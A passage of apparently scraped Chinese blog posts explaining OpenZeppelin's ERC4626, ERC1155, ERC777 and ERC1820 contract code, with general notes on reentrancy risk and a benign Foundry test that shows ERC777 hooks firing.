查询可以赎回的最大资产，这里返回的是vToken的数目。 123function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) &#123; return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);&#125; 将资产转化为shares，可以理解为黄金兑换为钞票，这步计算可以抽象看作是 1(assets * (totalSupply() + 10 ** _decimalsOffset())) / (totalAssets() + 1) 123function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view virtual returns (uint256) &#123; return shares.mulDiv(totalAssets() + 1, totalSupply() + 10 ** _decimalsOffset(), rounding);&#125; 将shares转化为资产，可以理解为钞票兑换为黄金，这步计算可以抽象看作是： 1(shares * ((totalAssets() + 1) / (totalSupply() + 10 ** _decimalsOffset()))) 123function previewDeposit(uint256 assets) public view virtual returns (uint256) &#123; return _convertToShares(assets, Math.Rounding.Floor);&#125; 该函数的功能是此时计算出指定的资产可以兑换多少shares。 123function previewMint(uint256 shares) public view virtual returns (uint256) &#123; return _convertToAssets(shares, Math.Rounding.Ceil);&#125; 该函数的功能是此时计算指定的shares可以兑换成多少资产。 123function previewWithdraw(uint256 assets) public view virtual returns (uint256) &#123; return _convertToShares(assets, Math.Rounding.Ceil); &#125; 该函数的功能是此时计算指定的shares可以兑换成多少资产。和previewMint()函数极其相似。 123456function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual &#123; SafeERC20.safeTransferFrom(_asset, caller, address(this), assets); _mint(receiver, shares); emit Deposit(caller, receiver, assets, shares);&#125; 这是存入资产的内部函数，通过SafeERC20的库函数，完成caller向address(this)转移_asset代币操作。 1function deposit(uint256 assets, address receiver) public virtual returns (uint256) 外部的存款函数，功能是msg.sender往该 vault存入执行数额的资产，并将兑换出的vToken发送到receiver地址，通过mint()函数，铸币数量是根据此时金库状态计算的uint256 assets = previewMint(shares)。 123456789101112131415function _withdraw( address caller, address receiver, address owner, uint256 assets, uint256 shares) internal virtual &#123; if (caller != owner) &#123; _spendAllowance(owner, caller, shares); &#125; _burn(owner, shares); SafeERC20.safeTransfer(_asset, receiver, assets); emit Withdraw(caller, receiver, owner, assets, shares);&#125; 该功能是取出资产的内部函数，要求调用者msg.sender必须是owner，或者msg.sender被owner授权。销毁owner数量为shares的vToken，并从金库向receiver转移_asset代币。 1234567891011function withdraw(uint256 assets, address receiver, address owner) public virtual returns (uint256) &#123; uint256 maxAssets = maxWithdraw(owner); if (assets &gt; maxAssets) &#123; revert ERC4626ExceededMaxWithdraw(owner, assets, maxAssets); &#125; uint256 shares = previewWithdraw(assets); _withdraw(_msgSender(), receiver, owner, assets, shares); return shares;&#125; 外部的取款函数，实现逻辑是调用内部的_withdraw()函数。参数是传入待取出的资产数量。 1234567891011function redeem(uint256 shares, address receiver, address owner) public virtual returns (uint256) &#123; uint256 maxShares = maxRedeem(owner); if (shares &gt; maxShares) &#123; revert ERC4626ExceededMaxRedeem(owner, shares, maxShares); &#125; uint256 assets = previewRedeem(shares); _withdraw(_msgSender(), receiver, owner, assets, shares); return assets;&#125; 这也是一个取款函数，内部调用的也是_withdraw()函数，但是和withdraw()函数不同的点在于，参数传入的是shares。 3. 总结 ERC4626 协议是一种用于代币化保险库的标准，它可以优化和统一收益保险库的技术参数。它为单个底层 ERC-20 代币的收益保险库提供了一个标准的 API，并为存入、取出、铸造、赎回等操作提供了基本功能。它在 DeFi 领域有很多潜在的应用场景，可以为用户提供更多的选择和便利。它也有助于推动收益保险库的发展和创新，为 DeFi 生态系统增加更多的价值。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC4626","slug":"ERC4626","permalink":"https://biyouqiuqiu.com/tags/ERC4626/"}]},{"title":"ERC1155","slug":"DEFI/ERC/ERC1155","date":"2024-01-15T04:00:00.000Z","updated":"2024-01-15T04:00:00.000Z","comments":true,"path":"2024/01/15/DEFI/ERC/ERC1155/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/15/DEFI/ERC/ERC1155/","excerpt":"","text":"1. ERC1155 简介 这是一个管理多种代币类型的合约标准，该合约可以包括同质化代币和非同质化代币，可以代表任意数量的同质化和非同质化的代币类型，抽象上可以解释为：ERC1155 囊括了 ERC20和ERC777这两种标准。ERC1155的用处，举个游戏的例子（王者荣耀）例子：要是使用ERC20来表示游戏的金币、钻石、点券，很明显ERC20无法做到，因为ERC20 token是同质化的，不能明确区分token与token之间的不同；要是使用ERC721，根据ERC721非同质化的特点，确实是可以表示金币、钻石、点券，但是ERC721 token不能细分，从而导致只能表示“1”个金币、钻石、点券，这很显然是不可取的。正是为了解决这些不足，从而发行了ERC1155标准，这可以很完美的解决上述问题。在ERC1155 token中不同的id表示不同的属性，而且还可以给id设置数量，有了这些特性，便可以很好的解决上述痛点。 同质化代币的表示方式为：如果某个id对应的代币总量为1，那么它就是非同质化代币，类似ERC721； 非同质化代币的表示方式为：如果某个id对应的代币总量大于1，那么他就是同质化代币，因为这些代币都分享同一个id，类似ERC20。 2. ERC1155代码解读代码来自 openzepelin：链接。 协议的官方文档：链接。 2.1 CoreIERC1155.sol 123456789101112131415161718192021222324252627282930313233343536373839// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import &#123;IERC165&#125; from &quot;../../utils/introspection/IERC165.sol&quot;;/** * @dev Required interface of an ERC-1155 compliant contract, as defined in the * https://eips.ethereum.org/EIPS/eip-1155[ERC]. */interface IERC1155 is IERC165 &#123; event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value); event TransferBatch( address indexed operator, address indexed from, address indexed to, uint256[] ids, uint256[] values ); event ApprovalForAll(address indexed account, address indexed operator, bool approved); event URI(string value, uint256 indexed id); function balanceOf(address account, uint256 id) external view returns (uint256); function balanceOfBatch( address[] calldata accounts, uint256[] calldata ids ) external view returns (uint256[] memory); function setApprovalForAll(address operator, bool approved) external; function isApprovedForAll(address account, address operator) external view returns (bool); function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes calldata data) external; function safeBatchTransferFrom( address from, address to, uint256[] calldata ids, uint256[] calldata values, bytes calldata data ) external;&#125; 这是IERC1155接口，接口中定义了六个函数 balanceOf()：单币种余额查询，返回account拥有的id种类的代币的持仓量。 balanceOfBatch()：多币种余额查询，查询的地址accounts数组和代币种类ids数组的长度要相等。 setApprovalForAll()：批量授权，将调用者的代币授权给operator地址。。 isApprovedForAll()：查询批量授权信息，如果授权地址operator被account授权，则返回true。 safeTransferFrom()：安全单币转账，将amount单位id种类的代币从from地址转账给to地址。如果to地址是合约，则会验证是否实现了onERC1155Received()接收函数。 safeBatchTransferFrom()：安全多币转账，与单币转账类似，只不过转账数量amounts和代币种类ids变为数组，且长度相等。如果to地址是合约，则会验证是否实现了onERC1155BatchReceived()接收函数。 IERC1155MetadataURI.sol 123interface IERC1155MetadataURI is IERC1155 &#123; function uri(uint256 id) external view returns (string memory);&#125; 这是一个可选接口，用于查询指定 token ID的 uri。如果继承了该接口，则需要在 ERC165的supportsInterface()函数中返回常量（用来检验是否实现该接口）。注意：该 uri()函数不得用于检查令牌是否存在，因为即使令牌不存在，实现也可能返回有效的字符串。 IERC1155Receiver.sol 如果ERC1155TOKEN的接收者receiver是一个合约地址，那么接收者必须要实现该接口。 该接口有两个函数：（前提是接收者是合约地址） onERC1155Received：这个函数是在调用 ERC1155的 safeTransferFrom()和 _mint()时，接收者的该函数会被调用，并按要求返回指定的值 bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;))。 onERC1155BatchReceived：这个函数时在调用 ERC1155的 safeBatchTransferFrom()时，接收者的该函数会被调用，并按要求返回指定的值 bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))。 ERC1155.sol 123mapping(uint256 id =&gt; mapping(address account =&gt; uint256)) private _balances;mapping(address account =&gt; mapping(address operator =&gt; bool)) private _operatorApprovals; _balances：用来保存 代币种类id对应 账户 account的余额，即保存 account拥有多少种类为id的token个数。 _operatorApprovals：用来保存 account对operator的授权情况，true表示已经授权，false表示未授权。 12345function unsafeMemoryAccess(uint256[] memory arr, uint256 pos) internal pure returns (uint256 res) &#123; assembly &#123; res := mload(add(add(arr, 0x20), mul(pos, 0x20))) &#125;&#125; 这是库合约中的函数，功能时读取 arr数组指定索引的值。 解释汇编 12345mload(add(add(arr, 0x20), mul(pos, 0x20)))add(arr,0x20) //跳过数组长度，定位到数据段mul(pos, 0x20) // EVM的存储机制是以32bytes为一个单位，这段操作码的结果是计算长度，比如 pos=2,则表示 2 * 32 bytesadd(add(arr, 0x20), mul(pos, 0x20)) // 计算 32bytes + pos * 32bytesmload(add(add(arr, 0x20), mul(pos, 0x20))) // 设 x = add(add(arr, 0x20), mul(pos, 0x20)),则表示读取[x, x+32bytes)的数据 其实就是用汇编的语言实现，读取数组指定索引的值。 1234function _asSingletonArrays( uint256 element1, uint256 element2) private pure returns (uint256[] memory array1, uint256[] memory array2) 这个函数的功能则是将传入的两个参数分别封装成两个 uint256[]类型的数组。汇编实现的逻辑都有注释，写得很清楚。 123456789101112131415161718192021222324252627282930313233343536function _update(address from, address to, uint256[] memory ids, uint256[] memory values) internal virtual &#123; if (ids.length != values.length) &#123; revert ERC1155InvalidArrayLength(ids.length, values.length); &#125; address operator = _msgSender(); for (uint256 i = 0; i &lt; ids.length; ++i) &#123; uint256 id = ids.unsafeMemoryAccess(i); uint256 value = values.unsafeMemoryAccess(i); if (from != address(0)) &#123; uint256 fromBalance = _balances[id][from]; if (fromBalance &lt; value) &#123; revert ERC1155InsufficientBalance(from, fromBalance, value, id); &#125; unchecked &#123; // Overflow not possible: value &lt;= fromBalance _balances[id][from] = fromBalance - value; &#125; &#125; if (to != address(0)) &#123; _balances[id][to] += value; &#125; &#125; if (ids.length == 1) &#123; uint256 id = ids.unsafeMemoryAccess(0); uint256 value = values.unsafeMemoryAccess(0); emit TransferSingle(operator, from, to, id, value); &#125; else &#123; emit TransferBatch(operator, from, to, ids, values); &#125; &#125; 这是资产更新的核心函数，参与完成铸币，转账，销币操作。要求参数的两个数组长度相等。 铸币：参数from的值为 address(0)，通过for循环为 _balances[id][to] += value添加余额，达成铸币。这对单次铸币和批量铸币都适用。 转账：参数from和to都不为address(0)，通过for循环完成对 from和to的余额修改，这对单次转账和批量转账都适用。 销币：参数to为address(0)，通过for循环修改_balances[id][from] = fromBalance - value;，要求fromBalance &gt;=value，这对单次销币和批量销币都适用。 12345678910111213141516171819function _updateWithAcceptanceCheck( address from, address to, uint256[] memory ids, uint256[] memory values, bytes memory data) internal virtual &#123; _update(from, to, ids, values); if (to != address(0)) &#123; address operator = _msgSender(); if (ids.length == 1) &#123; uint256 id = ids.unsafeMemoryAccess(0); uint256 value = values.unsafeMemoryAccess(0); ERC1155Utils.checkOnERC1155Received(operator, from, to, id, value, data); &#125; else &#123; ERC1155Utils.checkOnERC1155BatchReceived(operator, from, to, ids, values, data); &#125; &#125;&#125; 这个函数负责更新用户资产以及检验合约接受者是否实现了 checkOnERC1155Received接口，这里采用了 checks-effect-interaction的方式，将合约的交互放在了_update函数后面，一定程度上限制了对资金的重入风险，但是这里依旧存在重入的风险。 1function _safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data) internal 实现单笔转账，from和to都不能为address(0)，先通过_asSingletonArrays(id, value)将id和value包装成两个数组，再调用_updateWithAcceptanceCheck(from, to, ids, values, data)，进行资产的更新和对合约接收者的接口检验。 1function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data) public virtual 实现安全单笔转账，要求msg.sender是 from或者from对msg.sender执行了授权操作，否则revert()。转账逻辑调用_safeTransferFrom(from, to, id, value, data)。 1234567function _safeBatchTransferFrom( address from, address to, uint256[] memory ids, uint256[] memory values, bytes memory data ) internal 实现批量转账，from和to都不能为address(0)，调用_updateWithAcceptanceCheck(from, to, ids, values, data);进行资产的更新和对合约接收者的接口检验。 1234567function safeBatchTransferFrom( address from, address to, uint256[] memory ids, uint256[] memory values, bytes memory data ) public virtual 实现安全批量转账，将from所拥有的 ids，向to转移values，ids和values的索引是一一对应的。要求msg.sender是 from或者from对msg.sender执行了授权操作，否则revert()。转账逻辑调用_safeBatchTransferFrom(from, to, ids, values, data);。 1234567function _setApprovalForAll(address owner, address operator, bool approved) internal virtual &#123; if (operator == address(0)) &#123; revert ERC1155InvalidOperator(address(0)); &#125; _operatorApprovals[owner][operator] = approved; emit ApprovalForAll(owner, operator, approved);&#125; 授权操作，owner对operator执行授权操作，operator被授权之后可以操作owner的资产。同时也可以取消授权，即传入的参数approve为 false。 1234567function _mint(address to, uint256 id, uint256 value, bytes memory data) internal &#123; if (to == address(0)) &#123; revert ERC1155InvalidReceiver(address(0)); &#125; (uint256[] memory ids, uint256[] memory values) = _asSingletonArrays(id, value); _updateWithAcceptanceCheck(address(0), to, ids, values, data);&#125; 实现铸造ID为id的代币，且发行量为value。这里调用了_updateWithAcceptanceCheck()函数存在重入风险。 123456function _mintBatch(address to, uint256[] memory ids, uint256[] memory values, bytes memory data) internal &#123; if (to == address(0)) &#123; revert ERC1155InvalidReceiver(address(0)); &#125; _updateWithAcceptanceCheck(address(0), to, ids, values, data);&#125; 实现铸造ID为ids的代币，且发行量为values，代币ID号和发行量一一对应。这里调用了_updateWithAcceptanceCheck()函数存在重入风险。 2.2 ExtensionsERC1155Pausable.sol 12345678function _update( address from, address to, uint256[] memory ids, uint256[] memory values ) internal virtual override whenNotPaused &#123; super._update(from, to, ids, values); &#125; 实现了合约暂停功能，重写了ERC1155的_update函数，使得凡是调用该函数的操作都会受到控制。 ERC1155Burnable.sol 提供了代币注销功能，即间接的将两个内部的销币函数设置为external函数。当然了，执行销币的前提是msg.sender是token的owner或者是 operator。 ERC1155Supply.sol 主要提供了一个统计发行量的功能，铸币会使得_totalSupply[id]发行量增大；销币会使得_totalSupply[id]发行量减小。同时还可以通过exists(uint256 id)查询 token id 是否以及存在。 ERC1155URIStorage.sol 通过了设置 token 的 URI功能，同时还实现了为每一种 token设置 tokenURI。 2.3 UtilitiesERC1155Utils.sol 提供了两个用来验证接收者是否实现了指定接口和函数的功能。 12// function checkOnERC1155Receivedtry IERC1155Receiver(to).onERC1155Received(operator, from, id, value, data) returns (bytes4 response) 1234// function checkOnERC1155BatchReceivedtry IERC1155Receiver(to).onERC1155BatchReceived(operator, from, ids, values, data) returns ( bytes4 response ) 3. ERC1155安全隐患ERC1155存在重入风险，有重入风险的函数分别是： _updateWithAcceptanceCheck() _mint() _mintBatch() _safeTransferFrom() safeTransferFrom() _safeBatchTransferFrom() safeBatchTransferFrom()","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1155","slug":"ERC1155","permalink":"https://biyouqiuqiu.com/tags/ERC1155/"}]},{"title":"ERC777","slug":"DEFI/ERC/ERC777.sol","date":"2024-01-12T04:00:00.000Z","updated":"2024-01-12T04:00:00.000Z","comments":true,"path":"2024/01/12/DEFI/ERC/ERC777.sol/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/12/DEFI/ERC/ERC777.sol/","excerpt":"","text":"1. ERC777简介 这是是官方文档的说明：链接。我记录的是我读文档和代码的自我理解。 ERC777与ERC20兼容（兼容的意思就是ERC777的功能包括了ERC20的所有功能，实现兼容的方式就是，让ERC777直接继承IERC20接口。），同时引入了operator操作员的概念，操作员可以代表另一个地址（合约或者普通账户）发送代币，这个操作员的身份类似始于ERC20中被 某地址执行 approve操作后的身份，可以托管授权这的资产。同时还引进了sender和receiver的钩子函数（hooks）让代币持有者和代币接收者能有更多的处理。而且ERC777还采用了ERC1820标准的优点，可以判断某合约是否实现ERC777协议的相关接口，更重要的是还可以将sender&#x2F;receiver的钩子函数放到 地址的 implement去处理，这样一来，使得整个代币体系更丰富，拓展性也大大增强。 2. ERC777代码解读源码来自 openzeppelin：链接。阅读该代码必须要有ERC1820的前置知识，ERC777的源码可以分为core和hooks部分。 2.1 Core部分解读 ERC777.sol 1constructor(string memory name,string memory symbol,address[] memory defaultOperators) 构造函数：在部署ERC777合约的时候，就需要传入默认的 operator，而且默认的 operator不能进行增加和删除操作。而且还会将自身添加到 ERC1820注册表中_erc1820.setInterfaceImplementer(address(this), keccak256(&quot;ERC777Token&quot;), address(this));这行代码的意思就是，记录address(this)地址实现ERC777Token接口的合约地址是address(this)，换句话就是 “我”自己实现了 ERC777接口，并将其记录在注册表中。 2.1.1 View Funciotns**name() symbol() decimals() totalSupply() balanceOf()*这几个函数和ERC20的用法一样。需要注意的是：granularity()函数，granularity*必须在创建的时设置，且不能修改这个值。同时还要保证这个值必须 &gt;=1，执行 铸币，销币，发送操作的资产数量必须是 granularity的整数倍，否则就会被revert（如何理解呢，举个例子，比如granularity的值是2，执行mint操作的时候，mint(to,3)就会报错，因为 3%2!=0。）但是在 oppenzepelin源码中，granularity的值被设置为了1，所以可以不要太多考虑这个因素。 2.1.2 Operators操作员是ERC777引入的一个新概念，有普通操作员和默认操作员之分。 普通操作员：即是代币的 holder亲自给 operator授权的，该 operator只能操作 该holder的代币。 默认操作员：即合约初始化设置的操作员，ta的权限是最大的，默认情况下它可以操作所有人的代币，类似于管理员。但是用户可以自行将其移除权限，这样一来ta就不能操作自己的tokens了。 先理解三个mapping： 12345// Immutable, but accounts may revoke them (tracked in __revokedDefaultOperators).mapping(address =&gt; bool) private _defaultOperators;// For each account, a mapping of its operators and revoked default operators.mapping(address =&gt; mapping(address =&gt; bool)) private _operators;mapping(address =&gt; mapping(address =&gt; bool)) private _revokedDefaultOperators; _defaultOperators：保存某地址是不是默认操作员，在函数初始化的时候赋值。 _operators：保存 某地址是不是某代币holder的操作员，传参的方式为：_operators[tokenHolder][operator]。 _revokedDefaultOperators：保存某地址是否移除了默认操作员，传参的方式为：_revokedDefaultOperators[tokenHolder][operator])。 函数理解： 1isOperatorFor(address operator,address tokenHolder) 查看该 operetor是不是tokenHolder的操作员，如果 operator和tokenHolder相等则返回true（因为每个tokenHolder是自己的operator）。如果不等，则需要判断operator是不是默认操作员，同时该默认操作员不能被该tokenHolder取消授权过，如果是且没有取消授权则返回true。第三个代码段_operators[tokenHolder][operator]则是查看tokenHolder是否对operator授权了，yes true，no false。 1authorizeOperator(address operator) msg.sender（tokenHolder）为 指定 operator执行授权操作，需要注意的是 msg.sender不能等于operator，否则revert，因为msg.sendedr本身就是自己的操作员，所以不能再次授权。还需要判断该 operator是不是默认操作员，如果是则执行delete _revokedDefaultOperators[msg.sender][operator]操作（即将该值变成false），如果不是默认操作员，则将 operators映射的值更新为true（授权成功）。 1revokeOperator(address operator) msg.sender（tokenHolder）撤销 指定 operator操作员身份，需要注意的是 msg.sender不能等于operator，否则revert，因为msg.sendedr本身就是自己的操作员，所以不能撤销自己。如果 operator是默认操作员，则_revokedDefaultOperators[msg.sender][operator] = true这样一来默认操作员便不能操作msg.sender的tokens了。如果不是默认操作员，则将operator的值更新为false。 1defaultOperators() 返回默认操作员列表。 2.1.3 Send Tokens123456789101112131415function _callTokensToSend( address operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData) private&#123; address implementer = _erc1820.getInterfaceImplementer(from, TOKENS_SENDER_INTERFACE_HASH); if (implementer != address(0)) &#123; IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData); &#125;&#125; _callTokensToSend函数，先通过注册表getInterfaceImplementer(from, TOKENS_SENDER_INTERFACE_HASH)查看 tokenHolder 用来实现IERC777TokensSender接口的合约地址ADDRESS，如果有则调用ADDRESS中的tokensToSend函数。 123456789101112131415161718function _callTokensReceived( address operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData, bool requireReceptionAck) private&#123; address implementer = _erc1820.getInterfaceImplementer(to, TOKENS_RECIPIENT_INTERFACE_HASH); if (implementer != address(0)) &#123; IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData); &#125; else if (requireReceptionAck) &#123; require(!to.isContract(), &quot;ERC777: token recipient contract has no implementer for ERC777TokensRecipient&quot;); &#125;&#125; _callTokensReceived函数，先通过注册表getInterfaceImplementer(from, TOKENS_RECIPIENT_INTERFACE_HASH)查看 tokenHolder 用来实现IERC777Recipient接口的合约地址ADDRESS，如果有则调用ADDRESS中的tokensReceived函数，如果没有还需要判断传入的参数requireReceptionAck，如果参数为 true，那么则需要检测接收者to是否为合约地址，如果是合约地址则revert（其目的即使为了保证contract receiver必须实现 ERC777TokensRecipient）。 12345678910111213141516function _move( address operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData) private&#123; _balances[from] = _balances[from].sub(amount); _balances[to] = _balances[to].add(amount); emit Sent(operator, from, to, amount, userData, operatorData); emit Transfer(from, to, amount);&#125; _move函数则是负责更新余额，修改Holder和receiver的代币余额。 1234567891011121314151617181920function _send( address operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData, bool requireReceptionAck) private&#123; require(from != address(0), &quot;ERC777: send from the zero address&quot;); require(to != address(0), &quot;ERC777: send to the zero address&quot;); _callTokensToSend(operator, from, to, amount, userData, operatorData); _move(operator, from, to, amount, userData, operatorData); _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);&#125; ERC77 Token转移代币的逻辑，基本上都离不开这个函数。该函数要求 tokenHolder和receiver不能为零地址。先调用 tokenHolder的钩子函数，再更新账户的余额，最后调用receiver的钩子函数。 1234567operatorSend( address sender, address recipient, uint256 amount, bytes calldata data, bytes calldata operatorData ) 调用该函数需要判断 msg.sender是不是 sender的operator。随后调用 _send函数。 1send(address recipient, uint256 amount, bytes calldata data) 这是提供给tokenHolder的函数，因为调用_send函数的方式为：_send(msg.sender, msg.sender, recipient, amount, data, &quot;&quot;, true);自己是自己的操作员，同时还要求接收者必须实现ERC777TokensRecipient接口（如果接收者是合约地址）。 1transfer(address recipient, uint256 amount) 功能类似于send函数，也是提供给 tokenHolder 的函数。不过不同于send函数是，transfer不能传userdata，而且，如果recipient是合约地址的话，不需要满足合约地址一定要实现ERC777TokensRecipient接口的要求（前提是接收者不不能为零地址）。 1transferFrom(address holder, address recipient, uint256 amount) 功能类似ERC20中的transferFrom函数，需要 tokenHolder为 msg.sender授权，并且检查授权额度的操作在_approve(holder, spender, _allowances[holder][spender].sub(amount))，函数体没有显示的判断授权额度，而是通过了直接减的方法来验证，如果amount大于授权额度这个减法操作肯定会报错，也算一种另类的隐式检验了。 2.1.4 Mint &amp; Burn Tokens1234567_mint( address operator, address account, uint256 amount, bytes memory userData, bytes memory operatorData ) 铸币功能，铸多少币 _totalSupply 就要加多少。 铸币会调用_callTokensReceived函数，tokenHolder为零地址，而且还需要检测 recipient，如果recipient是合约地址的话，不需要满足合约地址一定要实现ERC777TokensRecipient接口的要求（前提是接收者不不能为零地址）。 注：在调用_mint()函数的函数中，要严格添加访问控制，因为 _mint()函数本身没有访问控制，避免出现人人可铸币的现象。 1234567_burn( address operator, address from, uint256 amount, bytes memory data, bytes memory operatorData ) 销币功能，私有函数，销毁多少币，_totalSupply 就要减多少。销币回调用_callTokensToSend函数，recipient为零地址。 1operatorBurn(address account, uint256 amount, bytes calldata data, bytes calldata operatorData) 外部销币函数，必须要满足isOperatorFor(msg.sender, account)才能成功调用。 2.2 Hooks部分2.2.1 ERC777TokensSender :: tokensToSend Hook这是一个执行转账或销币的前置钩子函数，即在执行转账之前需要从 ERC1820注册表中获取 实现接口的合约implementer，并执行 implementer合约中的tokensToSend ()函数，执行该钩子函数的逻辑。至于是什么逻辑，具体取决于合约的编写者，如果是执行恶意操作则可能会造成资金损失（重入攻击)。 涉及到的函数有：transferFrom() transfer() send() operatorSend() operatorBurn()。 2.2.2 ERC777TokensRecipient :: tokensReceived Hook这是一个执行转账或铸币的后置钩子函数，即在执行转账之后（更新完账户余额，即执行完 _move()函数）需要从 ERC1820注册表中获取 实现接口的合约implementer，并执行 implementer合约中的tokensReceived()函数，执行该钩子函数的逻辑。逻辑取决于合约的编写者，如果是执行恶意操作则可能会造成资金损失（重入攻击)。 涉及到的函数有：transferFrom() transfer() send() operatorSend() _mint()。 2.2.3 Hook的工作原理复现复现原理为：address(this)通过 operatorSend(address(this), address(this), 0, &quot;&quot;, &quot;&quot;)自己给自己转账，再执行转账之前，将address(this)的实现 IERC777Sender接口的合约为 sender，并写入注册表中；同理将address(this)的实现 IERC777Recipient接口的合约为 recipient，并写入注册表中。复现旨在说明，执行转账操作时，余额更新前后可以做一系列操作，需要注意防范。在 sender::tokensToSend输出事件emit BeforeMove(operator, from, to, amount, &quot;====== BeforeMove() ======&quot;)，在recipient::tokensReceived也输出事件emit AfterMove(operator, from, to, amount, &quot;====== AfterMove() ======&quot;)。 TestHooks.sol 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.13;import &quot;forge-std/Test.sol&quot;;import &#123;IERC777Sender&#125; from &quot;./IERC777Sender.sol&quot;;import &#123;IERC777Recipient&#125; from &quot;./IERC777Recipient.sol&quot;;import &#123;IERC1820Registry&#125; from &quot;../ERC1820/IERC1820Registry.sol&quot;;import &#123;ERC777&#125; from &quot;./ERC777.sol&quot;;contract TestHooks is Test &#123; string constant ERC1820_PATH = &quot;out/ERC1820.sol/ERC1820Registry.json&quot;; string constant ERC777Sender_PATH = &quot;out/IERC777Sender.sol/ERC777Sender.json&quot;; string constant ERCRecipient_PATH = &quot;out/IERC777Recipient.sol/ERC777Recipient.json&quot;; // string constant ERC777_PATH = &quot;../../../out/ERC777.sol/ERC777.json&quot;; IERC777Sender sender; IERC777Recipient recipient; IERC1820Registry registry; ERC777 erc777; address[] defaultOperators; // to deploy these contracts function setUp() public &#123; sender = IERC777Sender(deployer(ERC777Sender_PATH)); recipient = IERC777Recipient(deployer(ERCRecipient_PATH)); registry = IERC1820Registry(deployer(ERC1820_PATH)); // erc777 = ERC777(deployer(ERC777_PATH)); defaultOperators.push(address(this)); erc777 = new ERC777(&quot;TOKEN&quot;, &quot;token&quot;, address(registry), defaultOperators); &#125; function pre_test() internal &#123; // address(this)作为 defaultOperator // 1. address(this)用来实现 tokensToSend 函数的合约是 sender，将其写入注册表 registry.setInterfaceImplementer(address(this), keccak256(abi.encodePacked(&quot;ERC777TokensSender&quot;)), address(sender)); // 2. address(this)用来实现 tokensReceived 函数的合约是 recipient，将其写入注册表 registry.setInterfaceImplementer(address(this), keccak256(abi.encodePacked(&quot;ERC777TokensRecipient&quot;)), address(recipient)); &#125; function test_Hooks() public &#123; pre_test(); // 通过自己给自己转账，触发 sender和recipient中的hook函数 erc777.operatorSend(address(this), address(this), 0, &quot;&quot;, &quot;&quot;); &#125; // 部署合约 function deployer(string memory path) internal returns (address addr_) &#123; bytes memory creationCode = abi.encodePacked(vm.getCode(path)); assembly &#123; addr_ := create(0, add(creationCode, 0x20), mload(creationCode)) &#125; &#125;&#125; 3. ERC777的安全隐患 ERC777协议存在的安全隐患便是：重入漏洞（基本上就是在tokensToSend()和tokensReceived()）。该漏洞存在于_callTokensToSend()和_callTokensReceived()。具体的攻击事件和攻击步骤，后面再补充。","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC777","slug":"ERC777","permalink":"https://biyouqiuqiu.com/tags/ERC777/"}]},{"title":"ERC1820","slug":"DEFI/ERC/ERC1820","date":"2024-01-10T04:00:00.000Z","updated":"2024-01-10T04:00:00.000Z","comments":true,"path":"2024/01/10/DEFI/ERC/ERC1820/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/10/DEFI/ERC/ERC1820/","excerpt":"","text":"1. ERC1820简介 ERC1820标准定义了一个通用的注册表合约，任何地址（不管是合约地址还是E0A账户地址）都可以注册它支持的接口以及哪个智能合约负责接口实现。 2. ERC1820代码解读source code：链接。如果想看每个函数的各个参数代表什么意思，可以到这里：链接。 mapping(address &#x3D;&gt; mapping(bytes32 &#x3D;&gt; address)) internal interfaces：作用是保存某地址实现某接口的地址（说实话我感觉怪怪的，我感觉有点说不过去，举个例子：接口为I，A实现I的地址是B，换句话说就是，A用B地址来实现I接口，类似代理合约的逻辑，proxy基本上都是通过logic合约来执行逻辑）。 mapping(address &#x3D;&gt; address) internal managers：作用是保存某地址的管理员 mapping(address &#x3D;&gt; mapping(bytes4 &#x3D;&gt; bool)) internal erc165Cached：作用是用作缓存表，用来记录某地址是否实现了 IERC165接口。 ***noThrowCall(address _contract, bytes4 _interfaceId)***函数，的运作原理是_contract.staticcall(abi.encodeWithSelector(ERC165.supportsInterface.selector,_interfaceId))，即就是为了检测_contract合约是否实现了 IERC165且是否实现了指定接口_interfaceId。两个返回值的意思分别是，调用函数是否成功，返回值是否为true。 对于noThrowCall()函数，可以查缺补漏。 我好奇的是，对于 bytes4类型的 _interfaceId，执行mstore(add(x, 0x04), _interfaceId)操作之后，再预存储的32bytes里，ta是会被放在左端还是右端，同理对mstore(x, erc165ID)也是一样好奇，但是按照编码规则calldata应该为：bytes4(functon.selector)+paramters，所以应该是放在左端，写过测试用例验证： 1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.8.0;contract 